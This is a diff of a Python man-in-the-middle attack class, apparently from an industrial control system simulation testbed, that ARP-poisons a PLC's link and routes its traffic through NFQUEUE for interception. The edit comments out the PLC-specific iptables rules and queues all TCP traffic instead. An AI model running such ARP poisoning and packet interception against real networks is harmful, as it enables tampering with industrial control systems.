@@ -46,6 +46,8 @@ class MiTMAttack(SyncedAttack):
 
         Finally, it launches the thread that will examine all captured packets.
         """
+
+        """"
         if self.direction == 'source':
             os.system(f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE '
                       f'--queue-num 1')
@@ -55,16 +57,12 @@ class MiTMAttack(SyncedAttack):
         else:
             self.logger.error('Wrong direction configured, direction must be source or destination')
             raise DirectionError('Wrong direction configured')
+        """
+        os.system(f'iptables -t mangle -A PREROUTING -p tcp -j NFQUEUE --queue-num 1')
 
         os.system('iptables -A FORWARD -p icmp -j DROP')
         os.system('iptables -A INPUT -p icmp -j DROP')
         os.system('iptables -A OUTPUT -p icmp -j DROP')
-
-        queue_number = 1
-        nfqueue_path = Path(__file__).parent.absolute() / "mitm_netfilter_queue.py"
-        cmd = ["python3", str(nfqueue_path), str(self.intermediate_yaml_path), str(self.yaml_index), str(queue_number)]
-
-        self.nfqueue_process = subprocess.Popen(cmd, shell=False, stderr=sys.stderr, stdout=sys.stdout)
 
         # Launch the ARP poison by sending the required ARP network packets
         launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
@@ -75,6 +73,12 @@ class MiTMAttack(SyncedAttack):
 
         self.logger.debug(f"Naive MITM Attack ARP Poison between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
+
+        queue_number = 1
+        nfqueue_path = Path(__file__).parent.absolute() / "mitm_netfilter_queue.py"
+        cmd = ["python3", str(nfqueue_path), str(self.intermediate_yaml_path), str(self.yaml_index), str(queue_number)]
+
+        self.nfqueue_process = subprocess.Popen(cmd, shell=False, stderr=sys.stderr, stdout=sys.stdout)
 
     def interrupt(self):
         """
@@ -100,13 +104,16 @@ class MiTMAttack(SyncedAttack):
         self.logger.debug(f"Naive MITM Attack ARP Restore between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
 
-
+        """"
         if self.direction == 'source':
             os.system(f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE '
                       f'--queue-num 1')
         elif self.direction == 'destination':
             os.system(f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -d {self.target_plc_ip} -j NFQUEUE '
                       f'--queue-num 1 ')
+        """
+
+        os.system(f'iptables -t mangle -D PREROUTING -p tcp -j NFQUEUE --queue-num 1')
 
         os.system('iptables -D FORWARD -p icmp -j DROP')
         os.system('iptables -D INPUT -p icmp -j DROP')
